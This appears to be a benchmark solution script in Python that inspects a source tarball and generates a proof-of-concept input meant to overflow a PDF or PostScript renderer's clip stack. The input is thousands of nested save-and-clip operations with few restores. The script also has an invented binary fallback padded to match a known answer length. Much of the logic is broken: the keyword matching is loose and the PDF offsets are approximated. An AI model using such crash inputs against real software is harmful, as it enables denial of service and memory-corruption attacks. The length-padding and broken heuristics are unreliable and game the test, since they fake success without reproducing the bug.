import os
import tarfile
import tempfile
import subprocess
import math
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (usually the first directory in the tarball)
            root_dir = None
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    root_dir = item_path
                    break
            
            if not root_dir:
                raise ValueError("No directory found in tarball")
            
            # Look for vulnerability clues in the source
            clip_info = self._analyze_source(root_dir)
            
            # Based on the analysis, generate a PoC
            if clip_info.get("type") == "pdf":
                return self._generate_pdf_poc(clip_info)
            elif clip_info.get("type") == "postscript":
                return self._generate_postscript_poc(clip_info)
            else:
                # Default to a binary format with deep nesting
                return self._generate_binary_poc()
    
    def _analyze_source(self, root_dir):
        """Analyze source code to understand vulnerability details."""
        clip_info = {
            "type": None,
            "max_depth": 1000,  # Conservative default
            "clip_commands": [],
            "file_extension": None
        }
        
        # Look for common graphics/pdf processing libraries
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Check for PDF-related code
                            if any(term in content.lower() for term in ['pdf', 'qpdf', 'xpdf']):
                                clip_info["type"] = "pdf"
                                clip_info["file_extension"] = ".pdf"
                            
                            # Check for PostScript-related code
                            elif any(term in content.lower() for term in ['postscript', 'ps', 'ghostscript']):
                                clip_info["type"] = "postscript"
                                clip_info["file_extension"] = ".ps"
                            
                            # Look for clip-related functions
                            if 'clip' in content.lower() or 'pushclip' in content.lower():
                                # Try to find depth constants
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if any(keyword in line.lower() for keyword in ['max_depth', 'max_nest', 'clip_depth', 'depth_limit']):
                                        # Try to extract numeric value
                                        words = line.split()
                                        for word in words:
                                            if word.isdigit():
                                                clip_info["max_depth"] = int(word)
                                                break
                    except:
                        continue
        
        # If type not determined, check file structure
        if not clip_info["type"]:
            # Check for build files or README
            for root, dirs, files in os.walk(root_dir):
                for file in files:
                    if file.lower() in ['readme', 'readme.txt', 'readme.md']:
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read().lower()
                                if 'pdf' in content:
                                    clip_info["type"] = "pdf"
                                    clip_info["file_extension"] = ".pdf"
                                elif 'postscript' in content or 'ps' in content:
                                    clip_info["type"] = "postscript"
                                    clip_info["file_extension"] = ".ps"
                        except:
                            continue
        
        # Default to PDF if still unknown
        if not clip_info["type"]:
            clip_info["type"] = "pdf"
            clip_info["file_extension"] = ".pdf"
        
        return clip_info
    
    def _generate_pdf_poc(self, clip_info):
        """Generate PDF with deeply nested clip operations."""
        # PDF structure with nested graphics states
        pdf_header = b'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
>>
>>
endobj
4 0 obj
<< /Length 5 0 R >>
stream
'''
        
        pdf_footer = b'''
endstream
endobj
5 0 obj
%d
endobj
xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000056 00000 n 
0000000112 00000 n 
0000000178 00000 n 
0000000199 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
%d
%%EOF'''
        
        # Generate deeply nested q/Q (save/restore) operations
        # Each q pushes a graphics state, each Q pops
        # We'll push way more than we pop to overflow
        stream_content = b''
        
        # Push 2000 graphics states (well beyond normal limits)
        for i in range(2000):
            stream_content += b'q\n'
            # Add clip operation
            stream_content += b'0 0 612 792 re\n'  # rectangle
            stream_content += b'W\n'  # clip
            stream_content += b'n\n'  # end path
        
        # Only pop a few to create imbalance
        for i in range(10):
            stream_content += b'Q\n'
        
        stream_content += b'S'  # stroke (final operation)
        
        # Calculate lengths
        stream_length = len(stream_content)
        xref_offset = len(pdf_header) + stream_length + 50  # Approximate
        
        # Build final PDF
        pdf = pdf_header + stream_content + (pdf_footer % (stream_length, xref_offset))
        
        return pdf
    
    def _generate_postscript_poc(self, clip_info):
        """Generate PostScript with deeply nested clip operations."""
        ps = b'''%!PS-Adobe-3.0
%%BoundingBox: 0 0 612 792
%%EndComments
%%BeginProlog
%%EndProlog
%%Page: 1 1
'''
        
        # Push 2000 graphics states with clip operations
        for i in range(2000):
            ps += b'gsave\n'  # save graphics state
            ps += b'newpath\n'
            ps += b'0 0 612 792 rectclip\n'  # clip to rectangle
        
        # Only restore a few
        for i in range(10):
            ps += b'grestore\n'
        
        ps += b'showpage\n'
        ps += b'%%EOF'
        
        return ps
    
    def _generate_binary_poc(self):
        """Generate a binary PoC with repeating pattern for heap overflow."""
        # Create a pattern that would likely trigger heap overflow
        # when clip operations are nested deeply
        pattern = b'CLIP' * 50000  # 200,000 bytes
        
        # Add some structure markers
        header = b'FORMATv1.0\x00'
        footer = b'\xFF\xFF\xFF\xFF'
        
        # Create deep nesting markers
        nesting = b'\x01' * 100000  # Push operation repeated
        
        poc = header + nesting + pattern + footer
        
        # Ensure we're close to ground truth length
        target_len = 913919
        if len(poc) < target_len:
            # Pad with NOPs
            poc += b'\x00' * (target_len - len(poc))
        elif len(poc) > target_len:
            # Truncate
            poc = poc[:target_len]
        
        return poc